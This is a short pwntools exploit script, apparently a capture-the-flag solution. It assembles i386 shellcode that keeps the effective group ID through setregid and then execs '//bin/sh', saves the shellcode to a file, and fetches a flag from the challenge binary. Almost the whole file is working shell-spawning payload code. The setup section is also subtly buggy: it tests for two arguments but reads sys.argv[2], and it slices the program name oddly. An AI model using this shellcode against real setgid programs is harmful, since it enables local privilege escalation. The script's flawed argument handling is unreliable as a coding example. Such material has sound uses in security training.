#!/usr/bin/env python
from pwn import *
import pwn
import helpers

########################################################
# Exploit
########################################################

arch = 'i386'
shellcode = '''
    .att_syntax
    .att_mnemonic

    // arg0: getegid(); arg1: getegid()
    push $0x32 
    pop %eax
    int $0x80
    mov %eax, %ebx
    mov %eax, %ecx

    // call setregid(arg1, arg2)
    push $0x47
    pop %eax
    int $0x80

    // arg1 and arg2
    xor %edx, %edx
    xor %ecx, %ecx

    // arg0: '//bin/sh'
    xor %ebx, %ebx
    push %ebx
    push $0x68732f6e
    push $0x69622f2f
    mov %esp, %ebx

    // execve(arg0, arg1, arg2)
    push $0x0b
    pop %eax
    int $0x80
'''
compiled = asm(shellcode, arch=arch)
print(compiled)

with open('shellcode.bin', 'wb') as f:
    f.write(compiled)

########################################################
# Setup                                                #
########################################################
prog = './'
if len(sys.argv) == 2:
  prog += sys.argv[2]
else:
  prog += os.path.basename(os.getcwd())
  prog = prog[:2] + prog[5:]

elf = pwn.ELF(prog)
flag = helpers.get_flag(elf, "")
pwn.info(f'Flag: {flag}')
